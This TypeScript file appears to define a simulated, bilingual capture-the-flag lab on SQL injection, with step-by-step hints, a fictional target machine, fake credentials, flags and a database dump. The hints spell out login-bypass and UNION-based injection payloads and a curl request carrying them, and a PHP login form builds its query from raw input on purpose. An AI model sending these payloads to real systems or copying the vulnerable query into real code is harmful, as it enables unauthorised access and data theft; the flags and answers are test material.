// ── laboratorios/laboratorio06.ts ───────────────────────────────────────
// Scenario 6 — SQL Injection & Database Exfiltration Lab
// Datos específicos para este escenario

import { buildScenario, COMMON_PORTS, createFile, createLinuxFileSystem } from './templates';
import type { Scenario } from '../types';

// Datos específicos del escenario SQL Injection
const scenario06Data = {
  id: 'scenario-06',
  name: 'SQL Injection & Database Exfiltration',
  // Metadata for LandingPage cards
  tagline: 'Exploit SQL injection vulnerability to extract sensitive database records and escalate privileges.',
  taglineEs: 'Explota una vulnerabilidad de SQL injection para extraer registros sensibles de la base de datos y escalar privilegios.',
  description: 'SQL injection vulnerability exploitation and database enumeration.',
  descriptionEs: 'Explotación de vulnerabilidades de SQL injection y enumeración de bases de datos.',
  tools: ['arp-scan', 'nmap', 'curl', 'nc', 'hydra'],
  accentColor: '#f59e0b',
  networkRange: '192.168.40.0/24',
  dbVersion: 'MySQL 5.7',
  flags: {
    user: 'ZIL{SQL_INJECTION_FOUND}',
    root: 'ZIL{DATABASE_COMPROMISED}',
  },
  credentials: {
    sqlInjection: {
      payload: "' OR '1'='1",
      target: 'username',
    },
    database: {
      user: 'root',
      pass: 'SQLr00t@2024!',
    },
    ftp: {
      user: 'ftpuser',
      pass: 'ftp_dump_2024',
    },
  },
  targetMachine: {
    id: 'lab-scenario-06-sqli',
    hostname: 'sql-injection-web',
    mac: '08:00:27:D5:E6:F7',
    os: 'Ubuntu 18.04 LTS',
    type: 'server',
    ports: [
      { port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version: 'ProFTPD 1.3.5e' },
      { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.29' },
      { port: 3306, protocol: 'tcp', state: 'open', service: 'mysql', version: 'MySQL 5.7.26' },
    ],
    webServer: 'Apache/2.4.29',
    application: 'PHP 7.2 - Vulnerable Login Form',
    directories: [
      { path: '/', status: 200, description: 'Página de inicio' },
      { path: '/login', status: 200, description: 'Formulario de login (VULNERABLE)' },
      { path: '/admin', status: 403, description: 'Panel de administración' },
      { path: '/backup', status: 200, description: 'Directorio de respaldo' },
    ],
  },
  learningSteps: [
    { 
      task: 'Network Discovery', 
      taskEs: 'Descubrimiento de red', 
      text: 'Find the SQL injection target on the network', 
      textEs: 'Encontrá el objetivo de SQL injection en la red', 
      discoveryLevel: 1, 
      hints: { 
        hint1: { en: 'Use arp-scan to discover hosts', es: 'Usá arp-scan para descubrir hosts' }, 
        hint2: { en: 'arp-scan 192.168.40.0/24', es: 'arp-scan 192.168.40.0/24' } 
      } 
    },
    { 
      task: 'Port Enumeration', 
      taskEs: 'Enumeración de puertos', 
      text: 'Scan for open services and identify the web application', 
      textEs: 'Escanea puertos abiertos e identifica la aplicación web', 
      discoveryLevel: 2, 
      hints: { 
        hint1: { en: 'Use nmap to scan', es: 'Usá nmap para escanear' }, 
        hint2: { en: 'nmap -sV -p- 192.168.40.x', es: 'nmap -sV -p- 192.168.40.x' } 
      } 
    },
    { 
      task: 'Identify SQL Injection Vector', 
      taskEs: 'Identificar vector SQL injection', 
      text: 'Access the login form and test for SQL injection vulnerability', 
      textEs: 'Accedé al formulario de login y testeá para SQL injection', 
      discoveryLevel: 2, 
      hints: { 
        hint1: { en: 'Test payload: \' OR \'1\'=\'1', es: 'Testeá payload: \' OR \'1\'=\'1' }, 
        hint2: { en: 'Use curl to send the payload to /login', es: 'Usá curl para enviar el payload a /login' } 
      } 
    },
    { 
      task: 'Exploit SQL Injection', 
      taskEs: 'Explotar SQL injection', 
      text: 'Successfully bypass authentication using SQL injection', 
      textEs: 'Bypassea autenticación exitosamente con SQL injection', 
      discoveryLevel: 3, 
      hints: { 
        hint1: { en: 'Inject into the username field', es: 'Inyecta en el campo de usuario' }, 
        hint2: { en: 'curl -X POST http://192.168.40.x/login -d "username=\' OR \'1\'=\'1&password=x"', es: 'curl -X POST http://192.168.40.x/login -d "username=\' OR \'1\'=\'1&password=x"' } 
      } 
    },
    { 
      task: 'Database Enumeration', 
      taskEs: 'Enumeración de base de datos', 
      text: 'Extract database names and table information via SQL injection', 
      textEs: 'Extrae nombres de BD y información de tablas vía SQL injection', 
      discoveryLevel: 3, 
      hints: { 
        hint1: { en: 'Use UNION-based SQL injection', es: 'Usá UNION-based SQL injection' }, 
        hint2: { en: 'Payload: \' UNION SELECT table_name FROM information_schema.tables--', es: 'Payload: \' UNION SELECT table_name FROM information_schema.tables--' } 
      } 
    },
    { 
      task: 'FTP Access Setup', 
      taskEs: 'Configurar acceso FTP', 
      text: 'Connect to FTP to download database dump', 
      textEs: 'Conectate a FTP para descargar dump de la BD', 
      discoveryLevel: 4, 
      hints: { 
        hint1: { en: 'Use ftp command', es: 'Usá comando ftp' }, 
        hint2: { en: 'ftp 192.168.40.x (user: ftpuser, pass: ftp_dump_2024)', es: 'ftp 192.168.40.x (usuario: ftpuser, contraseña: ftp_dump_2024)' } 
      } 
    },
    { 
      task: 'Extract Database Dump', 
      taskEs: 'Extraer dump de base de datos', 
      text: 'Download the database dump file containing user credentials', 
      textEs: 'Descargá el archivo de dump que contiene credenciales de usuarios', 
      discoveryLevel: 4, 
      hints: { 
        hint1: { en: 'Look for database_dump.sql in FTP', es: 'Buscá database_dump.sql en FTP' }, 
        hint2: { en: 'Use get database_dump.sql in FTP shell', es: 'Usá "get database_dump.sql" en la shell de FTP' } 
      } 
    },
    { 
      task: 'Capture Flag', 
      taskEs: 'Capturar flag', 
      text: 'Find and extract the root flag from the database dump', 
      textEs: 'Encontrá y extrae la flag de root del dump de la BD', 
      discoveryLevel: 4, 
      hints: { 
        hint1: { en: 'Search for flag in the SQL dump file', es: 'Buscá "flag" en el archivo de dump SQL' }, 
        hint2: { en: 'cat database_dump.sql | grep -i flag', es: 'cat database_dump.sql | grep -i flag' } 
      } 
    },
  ],
};

// Construir el escenario usando las funciones importadas de templates
export const scenario_06: Scenario = buildScenario({
  id: scenario06Data.id,
  name: scenario06Data.name,
  description: 'Explotación de vulnerabilidades de SQL injection y enumeración de bases de datos.',
  difficulty: 'Medium',
  category: 'Web' as const,
  networkRange: scenario06Data.networkRange,
  targetMachine: {
    id: scenario06Data.targetMachine.id,
    machine_info: {
      hostname: scenario06Data.targetMachine.hostname,
      mac: scenario06Data.targetMachine.mac,
      os: scenario06Data.targetMachine.os,
      status: 'up',
      type: scenario06Data.targetMachine.type,
    },
    discovery_level: 0,
    scan_results: { ports: [] },
    ports: [
      { ...scenario06Data.targetMachine.ports[0], credentials: { user: scenario06Data.credentials.ftp.user, pass: scenario06Data.credentials.ftp.pass } },
      scenario06Data.targetMachine.ports[1],
      { ...scenario06Data.targetMachine.ports[2], credentials: { user: scenario06Data.credentials.database.user, pass: scenario06Data.credentials.database.pass } },
    ],
    web_enumeration: {
      web_server: scenario06Data.targetMachine.webServer,
      cms: scenario06Data.targetMachine.application,
      directories: scenario06Data.targetMachine.directories,
    },
    files: [
      ...createLinuxFileSystem({ username: 'www-data' }),
      createFile('/var/www/html/index.php', `
<?php
// Vulnerable PHP Login Form (Intentionally Vulnerable for Learning)
// DO NOT USE IN PRODUCTION

\$username = isset(\$_POST['username']) ? \$_POST['username'] : '';
\$password = isset(\$_POST['password']) ? \$_POST['password'] : '';

if (\$username && \$password) {
  // VULNERABLE: No prepared statements!
  \$query = "SELECT * FROM users WHERE username = '\$username' AND password = '\$password'";
  // Database would execute: SELECT * FROM users WHERE username = ' OR '1'='1
  echo "Checking credentials...";
}
?>
      `.trim(), 'text'),
      createFile('/srv/ftp/database_dump.sql', `
-- Database Dump (MySQL 5.7)
-- Generated: 2024-03-28

CREATE TABLE users (
  id INT PRIMARY KEY,
  username VARCHAR(50),
  password VARCHAR(255),
  email VARCHAR(100),
  role VARCHAR(20),
  flag VARCHAR(100)
);

INSERT INTO users VALUES
(1, 'admin', 'a6f62c4f1b9c8e3d', 'admin@internal.local', 'root', '${scenario06Data.flags.root}'),
(2, 'developer', 'e5f2a9c1d3b7g4h0', 'dev@internal.local', 'user', '${scenario06Data.flags.user}'),
(3, 'user', '1a2b3c4d5e6f7g8h', 'user@internal.local', 'guest', 'ZIL{USER_DATA_EXPOSED}');

-- INTERNAL: DO NOT EXPOSE
-- Root MySQL Password: ${scenario06Data.credentials.database.pass}
      `.trim(), 'text'),
      createFile('/home/www-data/flag.txt', scenario06Data.flags.root),
    ],
  },
  learningSteps: scenario06Data.learningSteps,
});

// Export data for metadata access
export { scenario06Data };
